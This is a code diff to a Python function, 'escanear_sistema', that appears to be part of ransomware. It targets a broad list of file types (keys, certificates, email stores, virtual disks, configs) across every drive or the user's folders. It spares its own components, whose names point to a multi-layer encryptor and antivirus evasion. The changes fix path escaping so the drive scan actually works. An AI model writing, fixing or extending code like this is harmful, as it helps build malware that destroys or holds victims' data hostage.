@@ -66,11 +66,12 @@ def escanear_sistema():
         '.dylib', '.o', '.a', '.lib', '.ocx', '.cpl', '.drv', '.efi',
         '.ini', '.cfg', '.conf', '.config', '.yaml', '.yml', '.toml',
         '.properties', '.env', '.editorconfig', '.htaccess', '.gitignore',
-        '.dockerignore', '.npmignore', '.eslintrc', '.prettierrc', '.babelrc','.log', '.bak', '.tmp', '.temp', '.cache', '.old', '.orig',
+        '.dockerignore', '.npmignore', '.eslintrc', '.prettierrc', '.babelrc',
+        '.log', '.bak', '.tmp', '.temp', '.cache', '.old', '.orig',
         '.swp', '.swo', '.DS_Store', '.localized', '.thumbs', '.lnk',
         '.vhd', '.vhdx', '.vmdk', '.vdi', '.qcow2', '.img', '.ova', '.ovf',
         '.vmx', '.vmem', '.vmsn', '.vmsd', '.nvram', '.vbox', '.hdd',
-        '.cer', '.crt', '.pem', '.key', '.pfx', '.p12', '.p7b', '.der',
+        '.cer','.crt', '.pem', '.key', '.pfx', '.p12', '.p7b', '.der',
         '.jks', '.keystore', '.pgp', '.gpg', '.asc', '.p7c', '.spc', '.p7r',
         '.eml', '.msg', '.pst', '.ost', '.mbox', '.emlx', '.mbx', '.dbx',
         '.epub', '.mobi', '.azw', '.azw3', '.fb2', '.lit', '.lrf', '.cbr',
@@ -96,8 +97,7 @@ def escanear_sistema():
     archivos_app = {
         'index.py', 'rutas.py', 'acciones.py', 'encriptador_12_capas.py',
         'evasion_av.py', 'launcher.py', 'launcher.bat', 'launcher.sh',
-        'imagen_sin.jpg', 'ADMINISTRADOR.jpg',
-        'llave.key', 'MASTER_PASSWORD.txt', 'comprimir.py', 'limpieza.bat'
+        'imagen_sin.jpg', 'ADMINISTRADOR.jpg'
     }
     
     dir_app = os.path.abspath(os.getcwd())
@@ -108,23 +108,23 @@ def escanear_sistema():
     
     if sistema == "Windows":
         if admin:
-            rutas_escanear = ['C:\\\\']
+            rutas_escanear = ['C:\\']
             for letra in 'DEFGHIJKLMNOPQRSTUVWXYZ':
-                unidad = f'{letra}:\\\\'
+                unidad = f'{letra}:\\'
                 if os.path.exists(unidad):
                     rutas_escanear.append(unidad)
         else:
             rutas_escanear = [
-                os.path.join(os.environ.get('USERPROFILE', 'C:\\\\Users'), 'Desktop'),
-                os.path.join(os.environ.get('USERPROFILE', 'C:\\\\Users'), 'Documents'),
-                os.path.join(os.environ.get('USERPROFILE', 'C:\\\\Users'), 'Downloads'),
-                os.path.join(os.environ.get('USERPROFILE', 'C:\\\\Users'), 'Pictures'),
-                os.path.join(os.environ.get('USERPROFILE', 'C:\\\\Users'), 'Videos'),
-                os.path.join(os.environ.get('USERPROFILE', 'C:\\\\Users'), 'Music'),
-                'C:\\\\Users',
-                'D:\\\\',
-                'E:\\\\',
-                'F:\\\\'
+                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Desktop'),
+                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Documents'),
+                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Downloads'),
+                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Pictures'),
+                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Videos'),
+                os.path.join(os.environ.get('USERPROFILE', 'C:\\Users'), 'Music'),
+                'C:\\Users',
+                'D:\\',
+                'E:\\',
+                'F:\\'
             ]
     else:
         rutas_escanear = ['/home', '/']
